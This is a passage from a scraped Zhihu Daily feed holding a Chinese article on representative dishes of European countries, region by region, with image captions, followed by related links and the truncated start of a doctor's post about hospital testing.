src=\"https://pic2.zhimg.com/v2-de798e55d17c90eb7f2a79551f3c3f41_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Gyros</figcaption></figure><p>希腊的饮食基本和土耳其爱琴海沿岸相近。Gyros 是土耳其旋转烤肉卷饼的希腊变种，和它的土耳其祖宗相比，希腊烤肉卷饼的关键区别在于——它一般是猪肉或鸡肉馅的。</p>\n<p><strong>塞浦路斯</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-91d33f7368c6fd3c2cac7a911ca5e05c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>高级餐馆的哈罗米干酪</figcaption></figure><p>哈罗米干酪（χαλλούμι）源自塞浦路斯，流行于希腊和东地中海各地。哈罗米干酪一般由山羊或绵羊奶制成，不容易融化，因此可以油炸或者烧烤，以代替肉类。</p>\n<p><strong>高加索</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ccceaf982ddbeb08b0355df4599f5046_720w.jpg?source=8673f162\" alt=\"\"><figcaption>高加索之亚美尼亚菜，抓饭、酸奶酱、芝士、Samosa、葡萄及其他</figcaption></figure><p>高加索山脉是亚欧的分界线，这片土地连接了欧亚，饮食习俗介于东欧、东地中海和中东之间，总体来说比较接近东地中海地区。</p>\n<p><strong>格鲁吉亚</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f8a144a0bf757e0e6068f7cf485e9d3a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Khinkali</figcaption></figure><p>Khinkali 起源于格鲁吉亚山区，看上去有点像小笼包。传统的 Khinkali 以肉末、洋葱、辣椒、孜然等制作馅料，吃法也是和小笼包类似的先咬破皮，再吸汤汁，最后吃掉。为了防止进食时弄破面皮，传统上，格鲁吉亚人是用手来吃 Khinkali 的。</p>\n<p><strong>亚美尼亚</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-bf6cfc737af247ff16934b4d1e7a355f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Harisa</figcaption></figure><p>Harisa 起源于亚美尼亚，被认为是亚美尼亚的国菜。传说亚美尼亚的基督教先驱圣格列高利为了给穷苦人民提供食物，制作了这种由小麦以及脂肪丰富的肉类制作的浓粥。这道菜是复活节期间的必备食物，斋戒日期间另有不含肉类的替代版。</p>\n<p><strong>阿塞拜疆</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-32e25f5cefe10618bfa055585d4c367f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Dolma</figcaption></figure><p>葡萄叶包饭（Dolma）是阿塞拜疆的非物质文化遗产，也是东地中海、高加索和中东的常见美食。这道菜看起来有点像中国的粽子或者百叶包，以葡萄叶或者其他蔬菜叶包裹蔬菜、肉类、坚果、奶酪、巴斯马蒂大米等、搭配芝麻酱、鸡蛋柠檬酱等食用。</p>\n<p><strong>巴尔干</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4c8c82149cff843960f0ee6b9b0e7fcf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>巴尔干之塞尔维亚菜，烤肉拼盘、复活节蛋糕、肉丸、抓饭、糕点、面包等</figcaption></figure><p>巴尔干位于欧洲东南部，当地的饮食融合了中欧、地中海和中东传统，深受奥斯曼帝国和希腊影响。数十年前，巴尔干并没有那么多国家，许多食物流行于巴尔干各地，超越了今日国家的界限。</p>\n<p><strong>保加利亚</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b45ba9ea9a6dfa03959a6a6422b93b11_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Tarator</figcaption></figure><p>保加利亚的饮食中，有大量汤和甜品，和其他巴尔干国家相似，保加利亚人爱喝酸奶。而由酸奶、黄瓜、大蒜、莳萝制作的 Tarator 汤，是保加利亚很常见的开胃菜，在夏季尤为流行。类似的汤在土耳其、希腊也很常见。</p>\n<p><strong>塞尔维亚</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-8ad6b542821457eb07777e8b744de047_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Pljeskavica</figcaption></figure><p>塞尔维亚人爱吃肉，尤其是各种烤肉。以猪肉、牛肉、羊肉糜混合制成的 Pljeskavica 可以说是塞尔维亚的国菜。这道菜看上去介于土耳其的碎肉烤肉和德国的汉堡肉饼之间，吃的时候一般配上洋葱、奶油酱、薯条和各种小菜。类似的烤肉在波黑、克罗地亚、黑山、北马其顿等地非常流行。</p>\n<p><strong>克罗地亚</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4cff9455a74a565f69bee6c146b31000_720w.jpg?source=8673f162\" alt=\"\"><figcaption>crni rižot</figcaption></figure><p>克罗地亚位于巴尔干沿海，沿海地区曾长期被威尼斯统治，饮食上受意大利影响较多，喜爱食用各种海鲜。加入墨鱼汁和橄榄油制作的 crni rižot 烩饭是克罗地亚非常有代表性的美食。</p>\n<p><strong>斯洛文尼亚</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-74b2d86be6b372b9b81e8624447428c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Štruklji</figcaption></figure><p>斯洛文尼亚是中欧最早皈信天主教的地区之一，历史上受德语区影响较大，各种各样的香肠以及德式泡菜见证了德国饮食文化的影响。Štruklji 是斯洛文尼亚比较有代表性的美食，由轧制面团填充各种馅料制成，馅料一般有核桃、苹果等，最受欢迎的则是干酪馅的Štruklji。</p>\n<p><strong>阿尔巴尼亚</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-271ae19da5434a9f74691fb974835b27_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Börek</figcaption></figure><p>阿尔巴尼亚人爱吃馅饼等糕点，Börek 是其中的代表。Börek 可能起源于中亚或东罗马帝国，这是种酥皮馅饼，在阿尔巴尼亚，馅料一般是奶酪、碎肉、洋葱、菠菜、鸡蛋等。</p>\n<p><strong>波斯尼亚和黑塞哥维那</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-382b41ff8c60cdda2254527642992b4a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Ćevapi</figcaption></figure><p>Ćevapi 是土耳其烤肉的波黑版本，也是波黑的国菜。奥斯曼统治时期，巴尔干的法外之徒（Hajduk）经常用猪油和肉类制作名为 hajdučki ćevap 的烤串，后来，类似的烤串逐渐由塞尔维亚的莱斯科瓦茨传播至南斯拉夫各地。波黑的Ćevapi 一般由牛肉制成，配上洋葱、酸奶油、白干酪等，放在 Somun 大饼或盘子中食用。</p>\n<p><strong>北马其顿</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7ac374f9c338e229a66d8daf69f87de6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Tavče gravče</figcaption></figure><p>由新鲜豆类制作的 Tavče gravče 是马其顿的国菜。制作 Tavče gravče，需要先把豆类清洗干净，整夜浸泡，之后放入当地传统的陶锅中慢慢煮熟，多次换水煮沸使其更容易消化。随后加入洋葱同煮，加入黑胡椒、辣椒、盐等调味。</p>\n<p><strong>黑山</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5c80e4af72f7d534f818c1134f326adb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Kačamak</figcaption></figure><p>黑山菜深受土耳其和巴尔干各国的影响。作为一个山地国家，玉米是黑山的重要主食之一。Kačamak 是一种玉米粥，流行于东南欧各国，黑山的 Kačamak 主要用玉米、土豆泥、羊奶酪等制作，非常浓稠。</p>\n<p><strong>中欧</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-71fbabbb1509f036148ceab1bb987ddb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>中欧之德国菜，香肠、土豆、泡菜、啤酒、蝴蝶脆饼</figcaption></figure><p>中欧是文明融合、自然环境各异的交界地带，从阿尔卑斯山到匈牙利草原，从日耳曼人到马扎尔人，中欧的每个国家都有其著名的代表性食物。总体来说，中欧气候的大陆性特征比较明显，饮食中水产比例相对较少，肉类以猪肉和牛肉为主，普遍都喜欢喝酒。</p>\n<p><strong>德国</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-34e8cbc5772a9c0ede0ea7484b721235_720w.jpg?source=8673f162\" alt=\"\"><figcaption>香肠配酸菜，德式吃法</figcaption></figure><p>德国有 1500 多种香肠，可以说，香肠是德国食物的象征。各式各样的香肠中，最常见的就是用猪肉碎肉制作的 Bratwürste。香肠可剪可烤，在德国，一般配酸菜或者土豆泥食用。</p>\n<p><strong>奥地利</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c9cdcf35229ed2a26a929ae45804b21a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>维也纳炸肉排</figcaption></figure><p>奥地利是奥匈帝国的统治中心所在，和德国相比，这里的饮食呈现出更多融合色彩。著名的维也纳炸肉排（Wiener schnitzel）是用小牛肉片裹上鸡蛋、面粉调制的面糊，粘上面包糠油炸而成的。后来，出现了用便宜的猪肉制作的炸肉排，据说是上海炸猪排的祖先。</p>\n<p><strong>瑞士</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-25a7b04214163c514325a9e301b103df_720w.jpg?source=8673f162\" alt=\"\"><figcaption>奶酪火锅</figcaption></figure><p>阿尔卑斯山麓的瑞士畜牧业发达，盛产奶酪。1699 年的烹饪书上，出现了奶酪火锅（Fondue）的最早记载，不过现代意义上用多种奶酪融化制作的奶酪火锅要到 19 世纪末才出现。1930 年，瑞士奶酪联盟将奶酪火锅推广为瑞士的国菜，成为瑞士民族融合的象征。</p>\n<p><strong>匈牙利</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a469513856e128de9931f5283a3f9609_720w.jpg?source=8673f162\" alt=\"\"><figcaption>共产主义大菜</figcaption></figure><p>匈牙利人的祖先来自欧亚内陆，他们们喜欢吃辣，饮食带有更多东欧元素。欧洲人常用土豆炖牛肉（Goulash）形容匈牙利菜，就连赫鲁晓夫也以这道菜作为匈牙利实现共产主义的象征。土豆炖牛肉可能源于匈牙利人祖先游牧时代的传统，不过其中的土豆和辣椒则来自美洲。</p>\n<p><strong>波兰</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-da98cbecc603c59f9cbb42d6519bba62_720w.jpg?source=8673f162\" alt=\"\"><figcaption>波兰饺子</figcaption></figure><p>波兰人擅长制作面点，喜欢吃肉类和菌菇，并以黄油和酸奶油调味。常见于中东欧各地的波兰饺子 Pierogi 是波兰饮食的代表。虽然看上去和中国饺子很像，不过波兰饺子的馅料一般是土豆、奶酪、酸菜、菌菇或者水果，一般配酸奶油或炸洋葱吃。</p>\n<p><strong>捷克</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-75238abe452323f41ad8ea47f5c91e3f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>比尔森啤酒</figcaption></figure><p>捷克是中欧中的中欧，饮食呈现出更明显的融合色彩。大多数捷克的代表性食物都并非其独有，不过捷克是人均喝啤酒最多的国家。那就用金色的比尔森啤酒（Pilsner）代表捷克吧。</p>\n<p><strong>斯洛伐克</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cf3b9e85c87b7d3cb9f2c44e6afa40a2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>羊奶酪土豆饺子</figcaption></figure><p>中东欧各国都有种叫做 Halušky 的土豆面粉皮饺子，在斯洛伐克，羊奶酪馅的土豆饺子 Bryndzové halušky 被誉为是该国的国菜，每年都会举办吃羊奶酪土豆饺子的比赛。</p>\n<p><strong>列支敦士登</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-51f6a11bc85bb8715ca09f5c6c25f5b2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Käseknöpfle</figcaption></figure><p>列支敦士登，不到 4 万人的袖珍国家。当地人主要是古代阿勒曼尼人的后代，饮食和物产都和瑞士差不多。用通心粉加上奶酪、洋葱制作的 Käseknöpfle 算是列支敦士登少有的特色食品了。</p>\n<p><strong>东欧</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-81a167d1a2aa36088b617cc09abc6b0c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>东欧之俄国菜，红菜汤、酸黄瓜、俄式饺子、黑面包及其他</figcaption></figure><p>东欧再往东，就是欧亚大陆的内陆，这里是欧洲海洋性最弱的地区，气候不如南欧和西欧那么舒适。典型的东欧食品包括谷物粥、乳制品、肉类、根茎类蔬菜、水果和酒精，以高胆固醇、高钠、高脂肪为特征。</p>\n<p><strong>俄罗斯</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-89b15fd042b902339e119ecd118422b0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>俄式白菜汤，上面的一坨酸奶油可以说是许多东欧菜的精髓了</figcaption></figure><p>俄罗斯有许多代表性食物，像首都色拉、格瓦斯、俄式饺子等等。俄国各个族群都有代表菜，不过总的来说，传统俄国菜大多是苦寒气候下的农家菜。以白菜和肉为基础的（щи）是其中的代表。中世纪的白菜汤配料中常包含面粉，用以增强粘稠度（古法白菜汤稠得可以竖起勺子）和耐饥性，热汤可以当主食，冷汤冻起来可以作为冬天的方便食品。今天的白菜汤则配料不限，丰俭由人。</p>\n<p><strong>乌克兰</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f1c105c28d42dd49c24bfa0f019b7f98_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Борщ</figcaption></figure><p>乌克兰被誉为欧洲粮仓，食物种类比俄罗斯丰富，喜欢用动物油脂调味胜过酸奶油。中国人熟悉的罗宋汤（Борщ）就起源于乌克兰。罗宋汤的成分包括肉、肉骨高汤、红菜头、卷心菜、胡萝卜、芹菜、土豆、洋葱、番茄等，传统罗宋汤制作起来很费时，口味酸甜而浓厚。</p>\n<p><strong>白俄罗斯</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b24dc88439a460cdd81b3d51ab9b8cae_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Draniki</figcaption></figure><p>白俄罗斯是当今苏联味最浓的国家，许多白俄罗斯餐馆都提供苏联时代的菜肴。历史上，白俄罗斯受波兰、立陶宛和俄罗斯文化影响，自身有代表性的食物不多，大体都和邻国类似。土豆是白俄罗斯食物的关键成分，也是东欧饮食的重要角色，就用土豆饼（Draniki）来代表吧。</p>\n<p><strong>罗马尼亚</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a509effa370876976a6e726f5c222c8a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>sarmale</figcaption></figure><p>罗马尼亚位于中欧、东欧和南欧的交界之处，深受土耳其和欧洲饮食的影响。sarmale（卷心菜肉卷）是罗马尼亚和摩尔多瓦的常见美食，由卷心菜叶包裹猪肉、洋葱、莳萝、百里香等制成，和中东常见的葡萄叶包饭 Dolma 同出一源。</p>\n<p><strong>摩尔多瓦</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-19704bfdf8f92424f5cf9f3c1d78acce_720w.jpg?source=8673f162\" alt=\"\"><figcaption>摩尔多瓦的玉米粥，稠得如同玉米糕</figcaption></figure><p>粥是东欧各国的日常主食，古代的罗马尼亚人主要吃小米粥，以至于东罗马人称他们为“吃粥的人”。在玉米传入后，它很快替代了小米，成为罗马尼亚粥（mămăligă）的主要食材。摩尔多瓦和罗马尼亚语言、文化几乎一致，这种浓稠的粥是两国饮食的共同代表。</p>\n<p><strong>波罗的海</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-8577c96c6395abc492ed5ca6d1a0a9a0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>波罗的海之立陶宛菜，甜菜、土豆、酸黄瓜、色拉及其他</figcaption></figure><p>直到 14 世纪，波罗的海的立陶宛都还是个信仰多神教的国家。这里的居民，既不是日耳曼人，也不是斯拉夫人，更不是拉丁人，在寒冷的波罗的海沿岸，他们勤勉地种植粮食，寻觅各种能吃的菌菇和浆果，通过腌制食品度过漫长的冬日。</p>\n<p><strong>立陶宛</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ffcf2db7b0c122b5639beebdae9d61b5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>šaltibarščiai</figcaption></figure><p>立陶宛大公国时期，人们发明了这道用甜菜头熬煮冷却，加上牛奶、酸奶、黄瓜、胡萝卜、莳萝、欧芹制作的粉红色浓汤（šaltibarščiai）。虽然颜色很神奇，但这种汤其实和我们熟悉的罗宋汤同出一源。</p>\n<p><strong>拉脱维亚</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-96a919880700dc288205323bce582bc2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Pelēkie zirņi</figcaption></figure><p>在土豆传来以前，大麦、豌豆和蚕豆是拉脱维亚人的主要食物。拉脱维亚和立陶宛种植一种棕色的豌豆，又称灰豌豆。用灰豌豆、培根、洋葱混合制作的 Pelēkie zirņi 是拉脱维亚的传统圣诞菜肴。</p>\n<p><strong>爱沙尼亚</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a3ae26e09321388019dc0730f2ae4b62_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Sepik</figcaption></figure><p>上千年来，全麦面包一直都是爱沙尼亚人不可或缺的主食。Sepik 是种源自爱沙尼亚的全麦面包，由小麦、黑麦、大麦混合制成，也可以加入麸皮，在爱沙尼亚，Sepik 是一种节庆食品，可搭配黄油、鲱鱼等食用。</p>\n<p><strong>北欧</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5def09a0595eb14b7ca45ac8a96beb0d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>北欧之挪威菜，三文鱼、浓汤、土豆泥、肉</figcaption></figure><p>受北大西洋暖流影响，北欧国家的气候并不像其纬度显示的那样苦寒。尽管如此，北欧的物产算不上丰富，在古代也不是什么富庶之地，传统北欧饮食比较简单，为了保存食物，多采用腌制和烟熏等方法。近年来，北欧兴起了新北欧烹饪风潮，倒是在世界上产生了一定影响。</p>\n<p><strong>丹麦</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c5e200a805472ba2c699423a4f9f4aea_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Smørrebrød</figcaption></figure><p>丹麦确实以黄油曲奇和酥皮面包出名，不过在丹麦国内，有一种食物，在日常生活中更常见，那就是开放式三明治（Smørrebrød）。开放式三明治既可以当主食，也可以作为外出时的便利食品，它的基础是涂着黄油的黑麦面包，上面可以放上各种奶酪、肉、鱼、蔬菜等。</p>\n<p><strong>瑞典</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-0ada00be08bb949b79226f438a1560e9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>kanelbulle</figcaption></figure><p>瑞典的鲱鱼罐头很有名，这能否算美食就见仁见智了。宜家的瑞典肉丸很出名，不过肉丸这种东西，全世界都有，相比之下，起源于瑞典的肉桂卷（kanelbulle）也许更有代表性。这是瑞典和芬兰的咖啡聚会（fika）中的常见食物，也是北美的早餐食物之一。</p>\n<p><strong>挪威</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5adbda2432fd17927b4e0c5352c3a3bd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>卷心菜羊肉</figcaption></figure><p>虽然挪威有不少腌制加工的黑暗料理，不过做法朴素的卷心菜羊肉（Fårikål）确是挪威官方认定的国菜。这道菜是用羊肉、卷心菜、黑胡椒和小麦粉在锅中炖煮制作的，一般配土豆吃。</p>\n<p><strong>芬兰</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c382b817476eada14200a28bf15fe2fe_720w.jpg?source=8673f162\" alt=\"\"><figcaption>karjalanpiirakat</figcaption></figure><p>直到 20 世纪前，肉类在芬兰菜中都不常见，由于气候恶劣，芬兰人一年难得能吃上新鲜蔬果，严重依赖块茎植物以及发酵、腌制食品。卡累利阿馅饼（karjalanpiirakat）是芬兰的传统美食，一般用黑麦制作饼皮，以土豆、萝卜或米饭为馅，讲究点的可以在上面放一些黄油和鸡蛋。</p>\n<p><strong>冰岛</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-02c3e713080a23fa53962e8f2f6d118b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Hákarl</figcaption></figure><p>冰岛气候寒冷，动物类食品是冰岛饮食的关键成分。冰岛人以吃臭文明，为了储存食物，许多冰岛食物都是通过腌制、风干、烟熏或者发酵制作的。发酵制作的臭鲨鱼（Hákarl）是其代表，据说其臭度是蓝纹芝士或者臭豆腐的几十倍。</p>\n<p><strong>西欧</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ab9580045247e0129f74c88408720530_720w.jpg?source=8673f162\" alt=\"\"><figcaption>西欧之法国菜，容器要大，菜不能多</figcaption></figure><p>西欧面向北大西洋，在文艺复兴之后，西欧成为了欧洲文化和经济的中心。西欧各国的饮食有不小的差别，不过总体上，作为近代世界范围影响力最大的地区之一，我们对西餐的大多数印象，就来自西欧。</p>\n<p><strong>法国</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8e8c011df20963c0fc7fdbcf01452f92_720w.jpg?source=8673f162\" alt=\"\"><figcaption>法式摆盘的鹅肝</figcaption></figure><p>法国以其丰富的物产和多样的烹饪手法闻名。如果说意大利菜是欧洲平民食物的代表，那么法国大餐就是高级餐饮的象征。法国人爱吃鹅肝（Foie gras），也是世界鹅肝酱产量最高的国家，虽然肥肝的生产起源于埃及，但是用这种不便宜的食材代表法国饮食，问题也不大。</p>\n<p><strong>比利时</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-692c44238d7fd586aaf8909359662d15_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Moules-frites</figcaption></figure><p>比利时以华夫饼和巧克力都很有名，除了这些零食以外，比利时美食的代表非牡蛎薯条（Moules-frites）莫属。这道菜被认为是比利时的国菜（虽然在法国也很流行），牡蛎薯条中的薯条虽然英文名叫“French Fries”，但比利时人坚持认为，薯条是比利时的发明。</p>\n<p><strong>荷兰</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bbdaa912b1b97df8a129764e1053d2f0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Hutspot 配香肠，和德国一样，香肠在荷兰饮食中也很常见</figcaption></figure><p>和邻国比利时相比，荷兰的传统饮食比较简单朴素，高碳水、高脂肪。蔬菜土豆泥（Hutspot）被誉为是荷兰的国菜，据说八十年战争期间，西班牙人在攻打莱顿失败后留下了煮熟的土豆片，之后就有了这道由土豆、胡萝卜、洋葱捣碎制作的菜肴。</p>\n<p><strong>卢森堡</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a69167ccd98fbe506f17d4864150a42e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Judd mat Gaardebounen</figcaption></figure><p>卢森堡位于法国和德国之间，饮食没有法国那么精致，农家色彩比较浓。熏猪肉和蚕豆搭配的 Judd mat Gaardebounen 在卢森堡很常见，据说这道菜是由西班牙军队带来的，也有人认为它和犹太人有关。</p>\n<p><strong>英国</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bb64ca9b64301052f703f8211cf64a30_720w.jpg?source=8673f162\" alt=\"\"><figcaption>传统的炸鱼薯条是用报纸包着出售的，这样看上去更有工人阶级色彩</figcaption></figure><p>作为工业革命的发源地，英国并不以其美食闻名。著名的炸鱼薯条据说起源于 1860 年的伦敦东区街头，由一位犹太男孩发明。作为简单、快捷的便携食品，炸鱼薯条体现了英国的文化融合、工人文化和岛国物产，用它作为英国菜的代表，应该是合适的。</p>\n<p><strong>爱尔兰</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-35a6c7af7c7aa6d78f63afc72eff2111_720w.jpg?source=8673f162\" alt=\"\"><figcaption>stobhach</figcaption></figure><p>爱尔兰位于西欧北部，在过去，这是一个因土豆歉收而死去上百万人的国家。可想而知，土豆在爱尔兰饮食中占据着重要的地位。爱尔兰最著名的炖肉（stobhach）就是用羊肉加上土豆、洋葱、胡萝卜一锅炖制作的。</p>\n<p><strong>摩纳哥</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-997e673e101b8190f323ce99c7475947_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Barbajuan</figcaption></figure><p>以赌场出名的摩纳哥，饮食传统介于意大利和法国之间。作为一个富有的旅游国家，摩纳哥的酒店和高级餐厅都很出名。在国庆节期间，摩纳哥人都要吃 Barbajuan，这是种夹着乳酪或者甜菜的油炸馅饼。</p>\n<p><strong>安道尔</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-13b85e74b87a79bc39e551360b1b848b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Escudella</figcaption></figure><p>安道尔是法国和西班牙之间的山区小国，当地的饮食与西班牙加泰罗尼亚地区类似。圣诞节期间享用的 Escudella i carn d'olla 包括鸡肉、小牛肉、肉丸、猪鼻、猪蹄、香肠、土豆、卷心菜、鹰嘴豆等，被认为是安道尔的国菜。</p>\n<p><strong>西地中海</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-7aeddd3f26c82b033721f3e21ce38819_720w.jpg?source=8673f162\" alt=\"\"><figcaption>西地中海之意大利菜，意大利面，面包，火腿、芝士，以及意大利菜常用的调味料</figcaption></figure><p><strong>意大利</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e2b76dd039c8d2f23de694fcf15c62b4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>玛格丽特披萨</figcaption></figure><p>意大利人是欧洲最热衷于吃的民族（之一），该国的代表性食物数不胜数。不过根据 Google trend 数据，披萨是所有意大利食物中搜索量最高的一个。来自那不勒斯的玛格丽特披萨得名于意大利王妃玛格丽特，她认为披萨上的罗勒、芝士和番茄酱正好代表了意大利国旗的三种颜色。</p>\n<p><strong>西班牙</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f6c08fae137050663ad032eeaeb73647_720w.jpg?source=8673f162\" alt=\"\"><figcaption>paella</figcaption></figure><p>在各种美食榜单上，西班牙是仅次于意大利和法国的欧洲美食大国。说到西班牙菜，大家都会想到海鲜饭，其实海鲜饭只是西班牙大锅饭（paella）中的一种。大锅饭起源于巴伦西亚，主要材料是大米、橄榄油、番红花，可以加上肉、蔬菜、海鲜等各种材料一同烹煮。这道菜中的大米和番红花，都体现了伊斯兰统治对西班牙的影响。</p>\n<p><strong>葡萄牙</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0f550f8c3fbe2871159503772c65e1e9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Pastel de nata</figcaption></figure><p>葡萄牙人善做甜点，西餐中许多和甜点有关的术语都来自葡萄牙。各种甜点中，最有名的非葡式蛋挞（Pastel de nata）莫属。过去，葡萄牙的修女使用大量蛋清给衣服上浆，剩下来的蛋黄则用来制作各种甜点。1820 年革命后，许多修道院面临关闭，修女们就自谋生路出售蛋挞。作为曾经的殖民大国，葡萄牙的饮食对世界产生了很大的影响，葡式蛋挞就是其中之一。</p>\n<p><strong>圣马力诺</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-78ccf28f73a8711953873aac1c996add_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Torta Tre Monti</figcaption></figure><p>圣马力诺是位于亚平宁半岛的国中之国，该国饮食传统和邻近的意大利大同小异。用华夫饼和榛子奶油制作的 Torta Tre Monti 以圣马力诺的山峰命名，可以作为其饮食的象征。</p>\n<p><strong>梵蒂冈</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-38aeba389bf120bf6fd62d33448c83fd_720w.jpg?source=8673f162\" alt=\"\"></figure><p>梵蒂冈是亚平宁半岛的另一个国中之国。几百年过去了，梵蒂冈依然保留着冷兵器时代的瑞士教皇卫队。据说教皇卫队最喜欢吃的一道菜是茄子配帕尔玛干酪（Parmigiana）。</p>\n<p><strong>马耳他</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-355441dd9500b85fe71e1fe5c62909b0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>stuffat tal-fenek</figcaption></figure><p>马耳他曾是圣约翰骑士团的驻地，这是欧洲唯一一个说亚非语的国家。炖兔肉（stuffat tal-fenek）是马耳他的国菜，这可能是出于对骑士团限制狩猎的抵制。</p>\n<p><strong>相关回答——</strong></p>\n<p><a href=\"https://www.zhihu.com/question/359455045/answer/1990710463\">中国为什么会形成如此丰富的「菜系」，国外也有著名的地区菜系吗？</a></p>\n<p><a href=\"https://www.zhihu.com/question/20436909/answer/1998692306\">为什么八大菜系中除了鲁菜之外都在中国的南方？</a></p>\n<p><a href=\"https://www.zhihu.com/question/23881332/answer/2002701945\">意大利菜都有哪些菜系，有什么经典菜式？</a></p>\n<p><a href=\"https://www.zhihu.com/question/26811467/answer/1468865582\">世界各国主食是什么？</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/152224073\">咖喱与抓饭——印度菜的环球之旅</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/350944140\">【回到过去当王爷】埃塞俄比亚的饮食传统</a></p>\n<p>（这是一个系列）</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/49717949\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738947"},{"title":"为什么现在去医院，不管什么病，都是抽血、拍片？","date":"2021-08-06 23:06:25","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>医生/爱思考/爱美食</span>\n<a href=\"https://www.zhihu.com/question/476272318/answer/2036861150\" hidden>阅读原文</a>\n</div>\n<div>\n<p>很多医生们也会觉得，当然要靠检验、检查。没有这些如何诊断疾病？那岂不是瞎猜吗？</p>\n<p>我也是医生。但我却认为，医生如真的依赖检查检验，没有自己的判断力，那真的就是饭桶！</p>\n<figure><img 